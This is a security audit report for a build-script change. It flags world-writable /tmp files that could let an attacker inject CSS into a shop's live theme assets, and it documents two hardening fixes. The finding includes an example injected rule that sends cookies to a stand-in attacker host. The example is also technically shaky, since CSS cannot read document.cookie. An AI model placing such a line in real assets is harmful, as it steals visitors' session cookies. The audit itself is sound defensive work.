# Epic Audit: ujg6.42

- Date: 2026-05-20
- Diff range: `ujg6.42-baseline..HEAD`
- Files changed: 6  (+1443 / -6 lines)

## Phase 1 — Code Map

| Category | Count |
| --- | ---: |
| Endpoints | 0 |
| Auth flows | 0 |
| State mutations | 0 |
| Dependencies | 7 |
| Flagged files | 6 |

## Phase 2 — Hardening Summary

- Total fixes: 2
- OWASP categories: A03:2021 - Injection, A05:2021 - Security Misconfiguration

## Phase 3 — Architectural Review

## Summary
Phase 2 correctly turned the browser sandbox back on and removed unsafe string interpolation in `coverage.js`. Those two spots are safe. The bigger missed risk, though, is that the build pipeline reads and writes intermediate files under `/tmp/ujg6.42` — a world-writable location on most systems. A local attacker or a compromised process on the same machine could swap those files and inject malicious CSS into the generated assets. That CSS would then be served to every visitor of the site.

## Critical
None.

## High
**Build pipeline trusts world-writable `/tmp` files — anyone on the machine can inject CSS into the live site**

The scripts in `scripts/ujg6.42/` store raw coverage data, bucket JSON, and HTML correction maps in `/tmp/ujg6.42/`. Since `/tmp` is typically writable by all users on the system, a malicious process (or a compromised one running under a different user) can modify those files before `wave-b-emit.py` reads them. An attacker could, for example, inject a CSS rule like `body { background: url("https://evil.example/steal?cookie="+document.cookie); }` into a chunk file. Because the emitter trusts the data it reads, that rule would end up in an actual `assets/theme-*.css` file and load for every shopper. This is a CSS injection with the potential to turn into a cross-site scripting payload or a site-wide defacement.

**Affected files**
- `scripts/ujg6.42/coverage.js` — writes coverage JSON to `/tmp/ujg6.42/coverage/`
- `scripts/ujg6.42/bucket.py` — reads coverage from `/tmp/ujg6.42/coverage/`, writes bucket JSON to `/tmp/ujg6.42/`
- `scripts/ujg6.42/wave-b-emit.py` — reads bucket JSON from `docs/ujg6.42-buckets.json` (safe) but also reads `class-presence.json` from `/tmp/ujg6.42/html-corrections/`

**Recommended fix**
Create a private temporary directory on every build run, ensure it is only readable/writable by the current user, and delete it after the artifacts are generated. For example, in each script, use something like:

```python
import tempfile, os
tmpdir = tempfile.mkdtemp(prefix='ujg6.42-', dir=tempfile.gettempdir())
os.chmod(tmpdir, 0o700)
```

Then pass that directory path around instead of a fixed `/tmp/ujg6.42`. The same pattern should replace the hard-coded `/tmp` path in `coverage.js` via Node’s `fs.mkdtempSync`.

## Medium
None.

## Low
None.

## Passed
- **Browser sandbox re-enabled** — The original `coverage.js` launched Brave without the sandbox (`--no-sandbox`, `--disable-setuid-sandbox`). Phase 2 removed those flags. The browser now runs with full OS-level process isolation. Even if the crawler hits a malicious page, a renderer exploit cannot escape to the host machine.
- **`page.evaluate` injection fixed** — Phase 2 converted all `page.evaluate` calls from string concatenation (e.g., `window.scrollTo(0, ${y})`) to the safe argument-passing form (e.g., `(scrollY) => window.scrollTo(0, scrollY), y`). No variable from Node.js can now be accidentally executed as code inside the page.

## Appendix — Phase 2 Hardened Blocks

<details>
<summary>1. `scripts/ujg6.42/coverage.js` — Disabling the Chromium sandbox (--no-sandbox, --disable-setuid-sandbox) removes the OS-level process isolation around the browser renderer. If the crawler visits a compromised or malicious page, a renderer exploit could escape and run arbitrary code on the host machine with full user privileges. [A05:2021 - Security Misconfiguration]</summary>

**Original:**
```
  const browser = await puppeteer.launch({
    executablePath: BRAVE,
    headless: 'new',
    args: ['--no-sandbox', '--disable-setuid-sandbox'],
  });
```

**Hardened:**
```
  const browser = await puppeteer.launch({
    executablePath: BRAVE,
    headless: 'new',
    args: [],
  });
```

</details>

<details>
<summary>2. `scripts/ujg6.42/coverage.js` — page.evaluate is called with template-literal strings that interpolate variables (e.g. `window.scrollTo(0, ${y})`). Any variable interpolated into a string passed to page.evaluate becomes executable JavaScript in the browser context. If a variable were ever not a plain number, arbitrary code could execute in the page. Puppeteer provides a safe argument-passing mechanism that avoids string concatenation entirely. [A03:2021 - Injection]</summary>

**Original:**
```
      const innerHeight = await page.evaluate('window.innerHeight');
      const docHeight = await page.evaluate('document.body.scrollHeight');
      for (let y = 0; y < docHeight; y += innerHeight * 0.8) {
        await page.evaluate(`window.scrollTo(0, ${y})`);
        await new Promise(r => setTimeout(r, 200));
      }
      await page.evaluate('window.scrollTo(0, 0)');
```

**Hardened:**
```
      const innerHeight = await page.evaluate(() => window.innerHeight);
      const docHeight = await page.evaluate(() => document.body.scrollHeight);
      for (let y = 0; y < docHeight; y += innerHeight * 0.8) {
        await page.evaluate((scrollY) => window.scrollTo(0, scrollY), y);
        await new Promise(r => setTimeout(r, 200));
      }
      await page.evaluate(() => window.scrollTo(0, 0));
```

</details>
